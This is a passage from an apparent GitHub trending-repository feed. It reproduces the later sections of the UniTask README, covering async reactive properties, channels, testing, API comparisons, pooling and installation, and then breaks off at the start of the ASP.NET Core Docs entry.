this.GetCancellationTokenOnDestroy()).Forget();&#xA;&#xA;rp.Value = 10; // push 10 to all subscriber&#xA;rp.Value = 11; // push 11 to all subscriber&#xA;&#xA;// WithoutCurrent ignore initial value&#xA;// BindTo bind stream value to unity components.&#xA;rp.WithoutCurrent().BindTo(this.textComponent);&#xA;&#xA;await rp.WaitAsync(); // wait until next value set&#xA;&#xA;// also exists ToReadOnlyAsyncReactiveProperty&#xA;var rp2 = new AsyncReactiveProperty&amp;lt;int&amp;gt;(99);&#xA;var rorp = rp.CombineLatest(rp2, (x, y) =&amp;gt; (x, y)).ToReadOnlyAsyncReactiveProperty(CancellationToken.None);&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;A pull-type asynchronous stream does not get the next values until the asynchronous processing in the sequence is complete. This could spill data from push-type events such as buttons.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;// can not get click event during 3 seconds complete.&#xA;await button.OnClickAsAsyncEnumerable().ForEachAwaitAsync(async x =&amp;gt;&#xA;{&#xA;    await UniTask.Delay(TimeSpan.FromSeconds(3));&#xA;});&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;It is useful (prevent double-click) but not useful sometimes.&lt;/p&gt; &#xA;&lt;p&gt;Using the &lt;code&gt;Queue()&lt;/code&gt; method will also queue events during asynchronous processing.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;// queued message in asynchronous processing&#xA;await button.OnClickAsAsyncEnumerable().Queue().ForEachAwaitAsync(async x =&amp;gt;&#xA;{&#xA;    await UniTask.Delay(TimeSpan.FromSeconds(3));&#xA;});&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Or use &lt;code&gt;Subscribe&lt;/code&gt;, fire and forget style.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;button.OnClickAsAsyncEnumerable().Subscribe(async x =&amp;gt;&#xA;{&#xA;    await UniTask.Delay(TimeSpan.FromSeconds(3));&#xA;});&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Channel&lt;/h2&gt; &#xA;&lt;p&gt;&lt;code&gt;Channel&lt;/code&gt; is the same as &lt;a href=&#34;https://docs.microsoft.com/en-us/dotnet/api/system.threading.channels?view=netcore-3.1&#34;&gt;System.Threading.Tasks.Channels&lt;/a&gt; which is similar to a GoLang Channel.&lt;/p&gt; &#xA;&lt;p&gt;Currently it only supports multiple-producer, single-consumer unbounded channels. It can create by &lt;code&gt;Channel.CreateSingleConsumerUnbounded&amp;lt;T&amp;gt;()&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;For producer(&lt;code&gt;.Writer&lt;/code&gt;), use &lt;code&gt;TryWrite&lt;/code&gt; to push value and &lt;code&gt;TryComplete&lt;/code&gt; to complete channel. For consumer(&lt;code&gt;.Reader&lt;/code&gt;), use &lt;code&gt;TryRead&lt;/code&gt;, &lt;code&gt;WaitToReadAsync&lt;/code&gt;, &lt;code&gt;ReadAsync&lt;/code&gt;, &lt;code&gt;Completion&lt;/code&gt; and &lt;code&gt;ReadAllAsync&lt;/code&gt; to read queued messages.&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;ReadAllAsync&lt;/code&gt; returns &lt;code&gt;IUniTaskAsyncEnumerable&amp;lt;T&amp;gt;&lt;/code&gt; so query LINQ operators. Reader only allows single-consumer but uses &lt;code&gt;.Publish()&lt;/code&gt; query operator to enable multicast message. For example, make pub/sub utility.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;public class AsyncMessageBroker&amp;lt;T&amp;gt; : IDisposable&#xA;{&#xA;    Channel&amp;lt;T&amp;gt; channel;&#xA;&#xA;    IConnectableUniTaskAsyncEnumerable&amp;lt;T&amp;gt; multicastSource;&#xA;    IDisposable connection;&#xA;&#xA;    public AsyncMessageBroker()&#xA;    {&#xA;        channel = Channel.CreateSingleConsumerUnbounded&amp;lt;T&amp;gt;();&#xA;        multicastSource = channel.Reader.ReadAllAsync().Publish();&#xA;        connection = multicastSource.Connect(); // Publish returns IConnectableUniTaskAsyncEnumerable.&#xA;    }&#xA;&#xA;    public void Publish(T value)&#xA;    {&#xA;        channel.Writer.TryWrite(value);&#xA;    }&#xA;&#xA;    public IUniTaskAsyncEnumerable&amp;lt;T&amp;gt; Subscribe()&#xA;    {&#xA;        return multicastSource;&#xA;    }&#xA;&#xA;    public void Dispose()&#xA;    {&#xA;        channel.Writer.TryComplete();&#xA;        connection.Dispose();&#xA;    }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;For Unit Testing&lt;/h2&gt; &#xA;&lt;p&gt;Unity&#39;s &lt;code&gt;[UnityTest]&lt;/code&gt; attribute can test coroutine(IEnumerator) but can not test async. &lt;code&gt;UniTask.ToCoroutine&lt;/code&gt; bridges async/await to coroutine so you can test async methods.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;[UnityTest]&#xA;public IEnumerator DelayIgnore() =&amp;gt; UniTask.ToCoroutine(async () =&amp;gt;&#xA;{&#xA;    var time = Time.realtimeSinceStartup;&#xA;&#xA;    Time.timeScale = 0.5f;&#xA;    try&#xA;    {&#xA;        await UniTask.Delay(TimeSpan.FromSeconds(3), ignoreTimeScale: true);&#xA;&#xA;        var elapsed = Time.realtimeSinceStartup - time;&#xA;        Assert.AreEqual(3, (int)Math.Round(TimeSpan.FromSeconds(elapsed).TotalSeconds, MidpointRounding.ToEven));&#xA;    }&#xA;    finally&#xA;    {&#xA;        Time.timeScale = 1.0f;&#xA;    }&#xA;});&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;UniTask&#39;s own unit tests are written using Unity Test Runner and &lt;a href=&#34;https://github.com/Cysharp/RuntimeUnitTestToolkit&#34;&gt;Cysharp/RuntimeUnitTestToolkit&lt;/a&gt; to integrate with CI and check if IL2CPP is working.&lt;/p&gt; &#xA;&lt;h2&gt;ThreadPool limitation&lt;/h2&gt; &#xA;&lt;p&gt;Most UniTask methods run on a single thread (PlayerLoop), with only &lt;code&gt;UniTask.Run&lt;/code&gt;(&lt;code&gt;Task.Run&lt;/code&gt; equivalent) and &lt;code&gt;UniTask.SwitchToThreadPool&lt;/code&gt; running on a thread pool. If you use a thread pool, it won&#39;t work with WebGL and so on.&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;UniTask.Run&lt;/code&gt; is now deprecated. You can use &lt;code&gt;UniTask.RunOnThreadPool&lt;/code&gt; instead. And also consider whether you can use &lt;code&gt;UniTask.Create&lt;/code&gt; or &lt;code&gt;UniTask.Void&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;IEnumerator.ToUniTask limitation&lt;/h2&gt; &#xA;&lt;p&gt;You can convert coroutine(IEnumerator) to UniTask(or await directly) but it has some limitations.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;WaitForEndOfFrame&lt;/code&gt;/&lt;code&gt;WaitForFixedUpdate&lt;/code&gt;/&lt;code&gt;Coroutine&lt;/code&gt; is not supported.&lt;/li&gt; &#xA; &lt;li&gt;Consuming loop timing is not the same as &lt;code&gt;StartCoroutine&lt;/code&gt;, it uses the specified &lt;code&gt;PlayerLoopTiming&lt;/code&gt; and the default &lt;code&gt;PlayerLoopTiming.Update&lt;/code&gt; is run before MonoBehaviour&#39;s &lt;code&gt;Update&lt;/code&gt; and &lt;code&gt;StartCoroutine&lt;/code&gt;&#39;s loop.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;If you want fully compatible conversion from coroutine to async, use the &lt;code&gt;IEnumerator.ToUniTask(MonoBehaviour coroutineRunner)&lt;/code&gt; overload. It executes StartCoroutine on an instance of the argument MonoBehaviour and waits for it to complete in UniTask.&lt;/p&gt; &#xA;&lt;h2&gt;For UnityEditor&lt;/h2&gt; &#xA;&lt;p&gt;UniTask can run on Unity Editor like an Editor Coroutine. However, there are some limitations.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;UniTask.Delay&#39;s DelayType.DeltaTime, UnscaledDeltaTime do not work correctly because they can not get deltaTime in editor. Therefore run on EditMode, automatically change DelayType to &lt;code&gt;DelayType.Realtime&lt;/code&gt; that wait for the right time.&lt;/li&gt; &#xA; &lt;li&gt;All PlayerLoopTiming run on the timing &lt;code&gt;EditorApplication.update&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;-batchmode&lt;/code&gt; with &lt;code&gt;-quit&lt;/code&gt; does not work because Unity does not run &lt;code&gt;EditorApplication.update&lt;/code&gt; and quit after a single frame. Instead, don&#39;t use &lt;code&gt;-quit&lt;/code&gt; and quit manually with &lt;code&gt;EditorApplication.Exit(0)&lt;/code&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Compare with Standard Task API&lt;/h2&gt; &#xA;&lt;p&gt;UniTask has many standard Task-like APIs. This table shows what the alternative apis are.&lt;/p&gt; &#xA;&lt;p&gt;Use standard type.&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;.NET Type&lt;/th&gt; &#xA;   &lt;th&gt;UniTask Type&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;IProgress&amp;lt;T&amp;gt;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;---&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;CancellationToken&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;---&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;CancellationTokenSource&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;---&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p&gt;Use UniTask type.&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;.NET Type&lt;/th&gt; &#xA;   &lt;th&gt;UniTask Type&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;Task&lt;/code&gt;/&lt;code&gt;ValueTask&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;UniTask&lt;/code&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;Task&amp;lt;T&amp;gt;&lt;/code&gt;/&lt;code&gt;ValueTask&amp;lt;T&amp;gt;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;UniTask&amp;lt;T&amp;gt;&lt;/code&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;async void&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;async UniTaskVoid&lt;/code&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;+= async () =&amp;gt; { }&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;UniTask.Void&lt;/code&gt;, &lt;code&gt;UniTask.Action&lt;/code&gt;, &lt;code&gt;UniTask.UnityAction&lt;/code&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;---&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;UniTaskCompletionSource&lt;/code&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;TaskCompletionSource&amp;lt;T&amp;gt;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;UniTaskCompletionSource&amp;lt;T&amp;gt;&lt;/code&gt;/&lt;code&gt;AutoResetUniTaskCompletionSource&amp;lt;T&amp;gt;&lt;/code&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;ManualResetValueTaskSourceCore&amp;lt;T&amp;gt;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;UniTaskCompletionSourceCore&amp;lt;T&amp;gt;&lt;/code&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;IValueTaskSource&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;IUniTaskSource&lt;/code&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;IValueTaskSource&amp;lt;T&amp;gt;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;IUniTaskSource&amp;lt;T&amp;gt;&lt;/code&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;ValueTask.IsCompleted&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;UniTask.Status.IsCompleted()&lt;/code&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;ValueTask&amp;lt;T&amp;gt;.IsCompleted&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;UniTask&amp;lt;T&amp;gt;.Status.IsCompleted()&lt;/code&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;new Progress&amp;lt;T&amp;gt;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;Progress.Create&amp;lt;T&amp;gt;&lt;/code&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;CancellationToken.Register(UnsafeRegister)&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;CancellationToken.RegisterWithoutCaptureExecutionContext&lt;/code&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;CancellationTokenSource.CancelAfter&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;CancellationTokenSource.CancelAfterSlim&lt;/code&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;Channel.CreateUnbounded&amp;lt;T&amp;gt;(false){ SingleReader = true }&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;Channel.CreateSingleConsumerUnbounded&amp;lt;T&amp;gt;&lt;/code&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;IAsyncEnumerable&amp;lt;T&amp;gt;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;IUniTaskAsyncEnumerable&amp;lt;T&amp;gt;&lt;/code&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;IAsyncEnumerator&amp;lt;T&amp;gt;&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;IUniTaskAsyncEnumerator&amp;lt;T&amp;gt;&lt;/code&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;IAsyncDisposable&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;IUniTaskAsyncDisposable&lt;/code&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;Task.Delay&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;UniTask.Delay&lt;/code&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;Task.Yield&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;UniTask.Yield&lt;/code&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;Task.Run&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;UniTask.RunOnThreadPool&lt;/code&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;Task.WhenAll&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;UniTask.WhenAll&lt;/code&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;Task.WhenAny&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;UniTask.WhenAny&lt;/code&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;Task.CompletedTask&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;UniTask.CompletedTask&lt;/code&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;Task.FromException&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;UniTask.FromException&lt;/code&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;Task.FromResult&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;UniTask.FromResult&lt;/code&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;Task.FromCanceled&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;UniTask.FromCanceled&lt;/code&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;Task.ContinueWith&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;UniTask.ContinueWith&lt;/code&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;TaskScheduler.UnobservedTaskException&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;UniTaskScheduler.UnobservedTaskException&lt;/code&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;Pooling Configuration&lt;/h2&gt; &#xA;&lt;p&gt;UniTask aggressively caches async promise objects to achieve zero allocation (for technical details, see blog post &lt;a href=&#34;https://medium.com/@neuecc/unitask-v2-zero-allocation-async-await-for-unity-with-asynchronous-linq-1aa9c96aa7dd&#34;&gt;UniTask v2 — Zero Allocation async/await for Unity, with Asynchronous LINQ&lt;/a&gt;). By default, it caches all promises but you can configure &lt;code&gt;TaskPool.SetMaxPoolSize&lt;/code&gt; to your value, the value indicates cache size per type. &lt;code&gt;TaskPool.GetCacheSizeInfo&lt;/code&gt; returns currently cached objects in pool.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;foreach (var (type, size) in TaskPool.GetCacheSizeInfo())&#xA;{&#xA;    Debug.Log(type + &#34;:&#34; + size);&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Allocation on Profiler&lt;/h2&gt; &#xA;&lt;p&gt;In UnityEditor the profiler shows allocation of compiler generated AsyncStateMachine but it only occurs in debug(development) build. C# Compiler generates AsyncStateMachine as class on Debug build and as struct on Release build.&lt;/p&gt; &#xA;&lt;p&gt;Unity supports Code Optimization option starting in 2020.1 (right, footer).&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/46207/89967342-2f944600-dc8c-11ea-99fc-0b74527a16f6.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;You can change C# compiler optimization to release to remove AsyncStateMachine allocation in development builds. This optimization option can also be set via &lt;code&gt;Compilation.CompilationPipeline-codeOptimization&lt;/code&gt;, and &lt;code&gt;Compilation.CodeOptimization&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;UniTaskSynchronizationContext&lt;/h2&gt; &#xA;&lt;p&gt;Unity&#39;s default SynchronizationContext(&lt;code&gt;UnitySynchronizationContext&lt;/code&gt;) is a poor implementation for performance. UniTask bypasses &lt;code&gt;SynchronizationContext&lt;/code&gt;(and &lt;code&gt;ExecutionContext&lt;/code&gt;) so it does not use it but if exists in &lt;code&gt;async Task&lt;/code&gt;, still used it. &lt;code&gt;UniTaskSynchronizationContext&lt;/code&gt; is a replacement of &lt;code&gt;UnitySynchronizationContext&lt;/code&gt; which is better for performance.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;public class SyncContextInjecter&#xA;{&#xA;    [RuntimeInitializeOnLoadMethod(RuntimeInitializeLoadType.SubsystemRegistration)]&#xA;    public static void Inject()&#xA;    {&#xA;        SynchronizationContext.SetSynchronizationContext(new UniTaskSynchronizationContext());&#xA;    }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This is an optional choice and is not always recommended; &lt;code&gt;UniTaskSynchronizationContext&lt;/code&gt; is less performant than &lt;code&gt;async UniTask&lt;/code&gt; and is not a complete UniTask replacement. It also does not guarantee full behavioral compatibility with the &lt;code&gt;UnitySynchronizationContext&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;API References&lt;/h2&gt; &#xA;&lt;p&gt;UniTask&#39;s API References are hosted at &lt;a href=&#34;https://cysharp.github.io/UniTask/api/Cysharp.Threading.Tasks.html&#34;&gt;cysharp.github.io/UniTask&lt;/a&gt; by &lt;a href=&#34;https://dotnet.github.io/docfx/&#34;&gt;DocFX&lt;/a&gt; and &lt;a href=&#34;https://github.com/Cysharp/DocfxTemplate&#34;&gt;Cysharp/DocfXTemplate&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;For example, UniTask&#39;s factory methods can be seen at &lt;a href=&#34;https://cysharp.github.io/UniTask/api/Cysharp.Threading.Tasks.UniTask.html#methods-1&#34;&gt;UniTask#methods&lt;/a&gt;. UniTaskAsyncEnumerable&#39;s factory/extension methods can be seen at &lt;a href=&#34;https://cysharp.github.io/UniTask/api/Cysharp.Threading.Tasks.Linq.UniTaskAsyncEnumerable.html#methods-1&#34;&gt;UniTaskAsyncEnumerable#methods&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;UPM Package&lt;/h2&gt; &#xA;&lt;h3&gt;Install via git URL&lt;/h3&gt; &#xA;&lt;p&gt;Requires a version of unity that supports path query parameter for git packages (Unity &amp;gt;= 2019.3.4f1, Unity &amp;gt;= 2020.1a21). You can add &lt;code&gt;https://github.com/Cysharp/UniTask.git?path=src/UniTask/Assets/Plugins/UniTask&lt;/code&gt; to Package Manager&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/46207/79450714-3aadd100-8020-11ea-8aae-b8d87fc4d7be.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/46207/83702872-e0f17c80-a648-11ea-8183-7469dcd4f810.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;or add &lt;code&gt;&#34;com.cysharp.unitask&#34;: &#34;https://github.com/Cysharp/UniTask.git?path=src/UniTask/Assets/Plugins/UniTask&#34;&lt;/code&gt; to &lt;code&gt;Packages/manifest.json&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;If you want to set a target version, UniTask uses the &lt;code&gt;*.*.*&lt;/code&gt; release tag so you can specify a version like &lt;code&gt;#2.1.0&lt;/code&gt;. For example &lt;code&gt;https://github.com/Cysharp/UniTask.git?path=src/UniTask/Assets/Plugins/UniTask#2.1.0&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Install via OpenUPM&lt;/h3&gt; &#xA;&lt;p&gt;The package is available on the &lt;a href=&#34;https://openupm.com&#34;&gt;openupm registry&lt;/a&gt;. It&#39;s recommended to install it via &lt;a href=&#34;https://github.com/openupm/openupm-cli&#34;&gt;openupm-cli&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;openupm add com.cysharp.unitask&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;.NET Core&lt;/h2&gt; &#xA;&lt;p&gt;For .NET Core, use NuGet.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;PM&amp;gt; Install-Package &lt;a href=&#34;https://www.nuget.org/packages/UniTask&#34;&gt;UniTask&lt;/a&gt;&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;UniTask of .NET Core version is a subset of Unity UniTask with PlayerLoop dependent methods removed.&lt;/p&gt; &#xA;&lt;p&gt;It runs at higher performance than the standard Task/ValueTask, but you should be careful to ignore the ExecutionContext/SynchronizationContext when using it. &lt;code&gt;AysncLocal&lt;/code&gt; also does not work because it ignores ExecutionContext.&lt;/p&gt; &#xA;&lt;p&gt;If you use UniTask internally, but provide ValueTask as an external API, you can write it like the following(Inspired by &lt;a href=&#34;https://github.com/mgravell/PooledAwait&#34;&gt;PooledAwait&lt;/a&gt;).&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;public class ZeroAllocAsyncAwaitInDotNetCore&#xA;{&#xA;    public ValueTask&amp;lt;int&amp;gt; DoAsync(int x, int y)&#xA;    {&#xA;        return Core(this, x, y);&#xA;&#xA;        static async UniTask&amp;lt;int&amp;gt; Core(ZeroAllocAsyncAwaitInDotNetCore self, int x, int y)&#xA;        {&#xA;            // do anything...&#xA;            await Task.Delay(TimeSpan.FromSeconds(x + y));&#xA;            await UniTask.Yield();&#xA;&#xA;            return 10;&#xA;        }&#xA;    }&#xA;}&#xA;&#xA;// UniTask does not return to original SynchronizationContext but you can use helper `ReturnToCurrentSynchronizationContext`.&#xA;public ValueTask TestAsync()&#xA;{&#xA;    await using (UniTask.ReturnToCurrentSynchronizationContext())&#xA;    {&#xA;        await UniTask.SwitchToThreadPool();&#xA;        // do anything..&#xA;    }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;.NET Core version is intended to allow users to use UniTask as an interface when sharing code with Unity (such as &lt;a href=&#34;https://github.com/Cysharp/MagicOnion/&#34;&gt;Cysharp/MagicOnion&lt;/a&gt;). .NET Core version of UniTask enables smooth code sharing.&lt;/p&gt; &#xA;&lt;p&gt;Utility methods such as WhenAll which are equivalent to UniTask are provided as &lt;a href=&#34;https://github.com/Cysharp/ValueTaskSupplement&#34;&gt;Cysharp/ValueTaskSupplement&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;This library is under the MIT License.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>dotnet/AspNetCore.Docs</title>
    <updated>2022-05-29T01:36:31Z</updated>
    <id>tag:github.com,2022-05-29:/dotnet/AspNetCore.Docs</id>
    <link href="https://github.com/dotnet/AspNetCore.Docs" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Documentation for ASP.NET Core&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;ASP.NET Core Docs&lt;/h1&gt; &#xA;&lt;p&gt;This repository contains the conceptual ASP.NET Core documentation hosted at &lt;a href=&#34;https://docs.microsoft.com/aspnet/core/getting-started&#34;&gt;docs.microsoft.com/aspnet/core&lt;/a&gt;. See the &lt;a href=&#34;https://raw.githubusercontent.com/dotnet/AspNetCore.Docs/main/CONTRIBUTING.md&#34;&gt;Contributing Guide&lt;/a&gt; and the &lt;a href=&#34;https://github.com/dotnet/AspNetCore.Docs/issues&#34;&gt;issues list&lt;/a&gt; if you would like to help.&lt;/p&gt; &#xA;&lt;p&gt;API documentation changes are made in the &lt;a href=&#34;https://github.com/dotnet/AspNetApiDocs&#34;&gt;AspNetApiDocs repository&lt;/a&gt; against the triple slash &lt;code&gt;///&lt;/code&gt; comments.&lt;/p&gt; &#xA;&lt;p&gt;ASP.NET 4.x documentation changes are made in the &lt;a href=&#34;https://github.com/dotnet/AspNetDocs&#34;&gt;dotnet/AspNetDocs 